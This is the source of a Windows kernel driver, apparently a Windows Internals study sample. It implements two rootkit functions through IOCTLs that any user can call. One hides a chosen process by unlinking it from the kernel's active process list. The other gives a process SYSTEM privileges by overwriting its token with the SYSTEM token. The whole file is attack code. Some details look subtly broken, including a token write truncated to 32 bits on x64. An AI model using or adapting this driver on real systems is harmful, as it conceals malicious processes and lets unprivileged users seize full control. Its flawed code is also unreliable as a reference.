#include <ntifs.h>
#include <ntddk.h>

#define TOKEN_OFFSET 0x4b8
#define LIST_ENTRY_OFFSET 0x448

#define POOL_TAG 'zKbA' //AbKz
void* poolAddr;

/*
DeviceType
	Contains the value for FILE_DEVICE_DOT4 (0x3a).
Function
	Contains the IOCTL Function value.
Method
	Contains the method codes for how buffers are passed for I/O and FS controls.
Access
	Contains the access check values.
*/
enum class ProcManIoctls {
	HideProcces = CTL_CODE(0x8000, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS),
	Elevate = CTL_CODE(0x8000, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)
};

struct ParametersFromUser {
	ULONG pid;
};

typedef struct _EX_FAST_REF {
	union {
		PVOID Object;
		ULONG RefCnt: 3;//0-3
		ULONG Value;
	};
} EX_FAST_REF, *PEX_FAST_REF;

extern "C" {
	void ProcManDriverUnload(_In_ PDRIVER_OBJECT DriverObject);
	NTSTATUS ProcManCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
	NTSTATUS ProcManDeviceControl(PDEVICE_OBJECT, PIRP Irp);
	
	NTSTATUS ProcManHandleHideProcess(PIRP Irp);
	NTSTATUS ProcManHandleElevate(PIRP Irp);
	NTSTATUS ProcManParametersFromIrp(PIRP Irp, ParametersFromUser &params);
}


//sc create ProcManpSrvs type= kernel binPath= D:\WindowsInternalsSamples\x64\Debug\ProcessManipulatorDriver.sys
extern "C" 
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);
	DbgPrint("ProcMan: DriverEntry started.\n");

	poolAddr = ExAllocatePoolWithTag(PagedPool, 100 * (1 << 20), POOL_TAG);
	if(!poolAddr) {
		DbgPrint("ProcMan: Error creating pool.\n");
		return STATUS_MEMORY_NOT_ALLOCATED;
	}
	DbgPrint("ProcMan: Allocated 100MB of PagedPool at: %p\n", poolAddr);
	
	DriverObject->DriverUnload = ProcManDriverUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = ProcManCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = ProcManCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = ProcManDeviceControl;

	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\ProcManDev");
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, 
		FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);

	if (!NT_SUCCESS(status)) {
		DbgPrint("ProcMan: Failed to create device (0x%08X)\n", status);
		return status;
	}

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\ProcManSymlink");
	status = IoCreateSymbolicLink(&symLink, &devName);
	if (!NT_SUCCESS(status)) {
		DbgPrint("ProcMan: Failed to create symbolic link (0x%08X)\n", status);
		IoDeleteDevice(DeviceObject);
		return status;
	}
	
	DbgPrint("ProcMan: DriverEntry completed successfully\n");
	return STATUS_SUCCESS;
}

void ProcManDriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\ProcManSymlink");
	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);
	ExFreePool(poolAddr);
	
	DbgPrint("ProcMan: driver unloaded and pool freed.\n");
}

NTSTATUS ProcManCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	DbgPrint("ProcMan: Create/Close called.\n");

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

NTSTATUS ProcManDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	NTSTATUS status = STATUS_SUCCESS;

	DbgPrint("ProcMan: Received an IOCTL.\n");
	switch (static_cast<ProcManIoctls>(stack->Parameters.DeviceIoControl.IoControlCode)) {
	case ProcManIoctls::HideProcces:
		status = ProcManHandleHideProcess(Irp);
		break;

	case ProcManIoctls::Elevate:
		status = ProcManHandleElevate(Irp);
		break;

	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = status;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS ProcManHandleHideProcess(PIRP Irp) {
	NTSTATUS status = STATUS_SUCCESS;
	ParametersFromUser params;

	DbgPrint("ProcMan: received HideProcess command.\n");
	status = ProcManParametersFromIrp(Irp, params);
	if (!NT_SUCCESS(status))
		return status;
	
	DbgPrint("ProcMan: HideProcess received process id: %d \n", params.pid);
	
	PEPROCESS eprocess;
	status = PsLookupProcessByProcessId(ULongToHandle(params.pid), &eprocess);
	if (!NT_SUCCESS(status)) {
		DbgPrint("ProcMan: HideProcess failed to locate process %d code: (0x%08X)\n", 
			params.pid, status);
		return status;
	}

	DbgPrint("ProcMan: HideProcess EPROCESS struct addr: %p\n", eprocess);
	
	unsigned char* listEntryAddr = reinterpret_cast<unsigned char*>(eprocess)
		+ LIST_ENTRY_OFFSET;//ActiveProcessLinks
	PLIST_ENTRY CurrListEntry = reinterpret_cast<PLIST_ENTRY>(listEntryAddr);
	DbgPrint("ProcMan: HideProcess address of list_entry: %p\n", CurrListEntry);
	
	if (!CurrListEntry)
		return STATUS_UNSUCCESSFUL;

	PLIST_ENTRY PrevListEntry = CurrListEntry->Blink;
	PLIST_ENTRY NextListEntry = CurrListEntry->Flink;

	// unlink target process from processes near in linked list
	PrevListEntry->Flink = CurrListEntry->Flink;
	NextListEntry->Blink = CurrListEntry->Blink;

	// Point Flink and Blink to self
	CurrListEntry->Flink = CurrListEntry;
	CurrListEntry->Blink = CurrListEntry;

	//decrease reference count of EPROCESS object
	ObDereferenceObject(eprocess);
	DbgPrint("ProcMan: Successfully unlinked process with pid: %d\n", params.pid);
	return STATUS_SUCCESS;
}

NTSTATUS ProcManHandleElevate(PIRP Irp) {
	NTSTATUS status = STATUS_SUCCESS;
	ParametersFromUser params;

	DbgPrint("ProcMan: received Elevate command.\n");
	status = ProcManParametersFromIrp(Irp, params);
	if (!NT_SUCCESS(status))
		return status;

	DbgPrint("ProcMan: Elevate received process id: %d \n", params.pid);
	
	//get EPROCESS structure for process to be elevated
	PEPROCESS eprocess;
	status = PsLookupProcessByProcessId(ULongToHandle(params.pid), &eprocess);
	if (!NT_SUCCESS(status)) {
		DbgPrint("ProcMan: Elevate failed to locate process by pid. code: (0x%08X)\n", 
			status);
		return status;
	}

	//get EPROCESS structure for system process
	PEPROCESS systemProc;
	status = PsLookupProcessByProcessId(ULongToHandle(4), &systemProc);
	if (!NT_SUCCESS(status)) {
		DbgPrint("ProcMan: Elevate failed to locate SYSTEM process by pid. code: (0x%08X)\n", 
			status);
		return status;
	}

	DbgPrint("ProcMan: Elevate EPROCESS struct addr: %p\n", eprocess);
	DbgPrint("ProcMan: Elevate SYSTEM EPROCESS struct addr: %p\n", systemProc);

	unsigned char* systemTokenAddress = reinterpret_cast<unsigned char*>(systemProc) + 
		TOKEN_OFFSET;
	EX_FAST_REF systemToken = *reinterpret_cast<PEX_FAST_REF>(systemTokenAddress);
	DbgPrint("ProcMan: Elevate System token EX_FAST_REF: %p\n", systemToken.Object);

	//elevate change the process token to point at the system token
	unsigned char* procTokenAddress = reinterpret_cast<unsigned char*>(eprocess) + 
		TOKEN_OFFSET;
	PULONG procTokenPointer = reinterpret_cast<PULONG>(procTokenAddress);
	*procTokenPointer = systemToken.Value;//eq

	//decrease reference count of EPROCESS objects
	ObDereferenceObject(eprocess);
	ObDereferenceObject(systemProc);

	return status;
}

NTSTATUS ProcManParametersFromIrp(PIRP Irp, ParametersFromUser& params) {
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(ParametersFromUser))
		return STATUS_BUFFER_TOO_SMALL;
	
	auto data = (ParametersFromUser*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
	if (data == nullptr) 
		return STATUS_INVALID_PARAMETER;
	
	params = *data;
	return STATUS_SUCCESS;
}

